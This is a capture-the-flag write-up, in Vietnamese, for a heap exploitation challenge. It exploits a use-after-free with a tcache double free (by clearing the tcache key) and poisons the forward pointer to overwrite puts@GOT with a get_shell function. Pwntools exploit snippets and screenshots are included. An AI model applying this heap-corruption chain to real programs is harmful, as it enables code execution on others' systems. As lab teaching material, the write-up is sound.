# 1. Find Bug : 

<img width="1089" height="502" alt="image" src="https://github.com/user-attachments/assets/683fb2c1-8257-4ebd-910d-fbe32d7f5f99" />

- Có bug `UAF` ở hàm `free`

<img width="547" height="175" alt="image" src="https://github.com/user-attachments/assets/9c939513-b8e1-4603-8a1d-a2461613eeac" />

- Có hàm `get_shell`

# 2. Idea :

<img width="1445" height="422" alt="image" src="https://github.com/user-attachments/assets/1b15c6fa-a48f-41c8-9109-fec88ffe90e4" />

- `Partial RELRO` + `PIE` tắt -> Tận dụng `double free` để overwrite `forward pointer` -> `got` puts -> `get_shell`

# 3. Exploit :

- Thử `free` xem bản libc này có `key` chống `double free` thẳng một cách dễ dàng chưa 

<img width="1103" height="370" alt="image" src="https://github.com/user-attachments/assets/d4f736f7-f3a2-4825-9a9a-8bd1201e9a31" />

-  -> Vậy đã có `key`, ý tưởng sẽ là tận dùng `uaf` + hàm `modify` để overwrite `key` để có thể `double free`

<img width="858" height="618" alt="image" src="https://github.com/user-attachments/assets/84ac21d2-8515-4c0d-8c38-b0ab8e398e19" />

- Trước hết cứ tạo 2 chunk và xóa 1 chunk đi

<img width="2558" height="721" alt="image" src="https://github.com/user-attachments/assets/56381715-3d27-4f51-b6ce-53555f99f92c" />
-------------

```
create(0x100, b'0' * 0x100)
create(0x100, b'1' * 0x100)
slna(b'> ', 3)
dell(0)
```

- Ko hiểu sao chọn `option 3` rồi nó vẫn hỏi lại nên phải chèn thêm 1 lần `slna(b'> ', 3)` 

- Tiếp đến ta cần overwrite `key : 0x000000000606e010` thành 1 số bất kì để có thể `double free`

```
edit(0, 0x10, p64(0) + p64(0))
dell(0)
```
--------------
<img width="2559" height="1599" alt="image" src="https://github.com/user-attachments/assets/bc264d3b-d96c-4d7f-9935-6fb28b3f6884" />

- Như đã check thì đã `double free` thành công 

- Tiếp theo ta sẽ overwrite `forward pointer` -> `got` puts

```
edit(0, 0x8, p64(exe.got.puts))
```
---------------
<img width="1258" height="889" alt="image" src="https://github.com/user-attachments/assets/f45db9d0-f68e-4496-9e93-a9ac872551af" />

- Vậy cuối cùng ta chỉ cần malloc 1 lần để allocated phần tcache đầu, rồi malloc thêm lần nữa với data là hàm `get_shell` -> Overwrite thành công `got` puts thành hàm `get_shell`

```
create(0x100, b'2' * 0x100)
slna(b'> ', 1)
create(0x100, p64(exe.sym.get_shell))
```
--------------
<img width="2559" height="1599" alt="image" src="https://github.com/user-attachments/assets/c123fa39-e08d-4fa2-b873-f4f875690cdc" />

# 4. Get Flag :

<img width="1940" height="257" alt="image" src="https://github.com/user-attachments/assets/6c15da9a-02d8-447c-b650-6cfefde63b11" />
